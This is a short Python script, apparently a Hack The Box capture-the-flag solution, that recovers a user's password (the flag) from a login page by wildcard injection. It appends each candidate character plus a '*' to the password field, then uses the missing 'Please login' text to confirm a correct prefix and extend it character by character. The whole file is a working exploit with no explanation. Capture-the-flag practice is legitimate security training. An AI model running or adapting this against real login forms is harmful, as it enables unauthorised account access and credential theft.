import requests

url = 'http://138.68.178.56:31921/login'
username = 'reese'
password = 'HTB{'
char_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '!', '}']
i = -1
while(True):
		i = i + 1
		element = char_list[i]
		#print("Trying " + password+element+'*')
		data = {'username': username, 'password':password+element+'*'}
		response = requests.post(url, data=data)
		if(response.text.find('Please login') == -1):
			print("--> " + (password+element))
			password = password+element
			i = -1
			continue
		if('qwertyuiopasdfghjklzxcvbnm'.find(element) >= 0):
			data = {'username':username, 'password':password+element.upper()+'*'}
			#print("Trying " + password+element.upper()+'*')
			response = requests.post(url, data=data)
			if(response.text.find('Please login') == -1):
				print("--> " + (password+element.upper()))
				password = password + element.upper()
		if(password[-1] == '}'):
			break
print("Final password for user " + username + " is " + password)
